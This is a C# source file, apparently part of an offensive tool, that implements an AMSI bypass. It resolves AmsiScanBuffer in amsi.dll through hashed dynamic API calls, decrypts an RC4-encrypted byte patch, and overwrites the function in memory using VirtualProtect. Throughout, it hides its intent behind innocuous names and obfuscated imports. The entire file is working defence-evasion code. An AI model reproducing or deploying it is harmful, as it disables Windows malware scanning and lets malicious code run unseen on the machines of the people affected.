using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using PositiveIntent.Data;
using PositiveIntent.DynamicInvoke;

namespace PositiveIntent;

// TODO: add better error handling
// TODO: fully implement D/Invoke w/ API hashing
public class Bannana
{
    public static void Peel()
    {
        object[] parameters = ["amsi.dll"];
        var hModule = Generic.GetLoadedModuleAddress("6B57900FDD9BC3ED1AACC8BB36AF6749", 0x123456789); // kernel32.dll
        var hPointer = Generic.GetExportAddress(hModule, "9AE8798D35BD945359EE61388A24DF4F", 0x123456789); // LoadLibraryA
        Generic.DynamicFunctionInvoke<IntPtr>(hPointer, typeof(LoadLibraryA), ref parameters);
        //Generic.DynamicApiInvoke<IntPtr>("kernel32.dll", "LoadLibraryA", typeof(LoadLibraryA), ref parameters);

        var modules = Process.GetCurrentProcess().Modules;
        var hAmsi = IntPtr.Zero;

        foreach (ProcessModule module in modules)
        {
            if (module.ModuleName == "amsi.dll")
            {
                hAmsi = module.BaseAddress;
                break;
            }
        }

        parameters = [hAmsi, "AmsiScanBuffer"];
        hPointer = Generic.GetExportAddress(hModule, "BA0307826406754C1A4B8DDF988DD065", 0x123456789); // GetProcAddress
        IntPtr asb = Generic.DynamicFunctionInvoke<IntPtr>(hPointer, typeof(GetProcAddress), ref parameters);
        //IntPtr asb = Generic.DynamicApiInvoke<IntPtr>("kernel32.dll", "GetProcAddress", typeof(GetProcAddress), ref parameters);

        if (IntPtr.Size == 8) // 64 bit process
        {
            var epatch = new byte[] { 0xaa, 0x85, 0x52, 0xf, 0x48, 0xc4, 0xf0, 0x3e, 0x53, 0x94, 0x15, 0x1c };
            byte[] key = System.Text.Encoding.UTF8.GetBytes("DepthSecurity");
            RC4 rc4 = new RC4(key);
            byte[] dpatch = rc4.EncryptDecrypt(epatch);
            Eat(asb, dpatch);
        }
        else
        {
            Environment.Exit(-1);
        }
    }

    public static void Eat(IntPtr asb, byte[] garbage)
    {
        // Set region to RW
        //var addressVirtualProtect = Generic.GetLibraryAddress("k" + "er"+ "n" + "e" + "l" + "32" + ".d" + "ll", "Vir" + "tu" + "al" + "Pr" + "o" + "te" + "c" + "t");
        //var VirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(addressVirtualProtect, typeof(VirtualProtect));
        //VirtualProtect(asb, (UIntPtr)garbage.Length, 0x04, out uint oldProtect);
        uint lpflOldProtect = 0;
        object[] parameters = [asb, (UIntPtr)garbage.Length, Win32.WinNT.PAGE_READWRITE, lpflOldProtect];
        var hModule = Generic.GetLoadedModuleAddress("6B57900FDD9BC3ED1AACC8BB36AF6749", 0x123456789); // kernel32.dll
        var hPointer = Generic.GetExportAddress(hModule, "6AD9B16D84969CC7B7136C1771784F8C", 0x123456789); // VirtualProtect
        Generic.DynamicFunctionInvoke<bool>(hPointer, typeof(VirtualProtect), ref parameters);

        // Copy patch
        Marshal.Copy(garbage, 0, asb, garbage.Length);

        // Retore region to RX
        //VirtualProtect(asb, (UIntPtr)garbage.Length, oldProtect, out uint _);
        parameters = [asb, (UIntPtr)garbage.Length, parameters[3], lpflOldProtect];
        Generic.DynamicFunctionInvoke<bool>(hPointer, typeof(VirtualProtect), ref parameters);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr LoadLibraryA(
        string lpLibFileName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);
}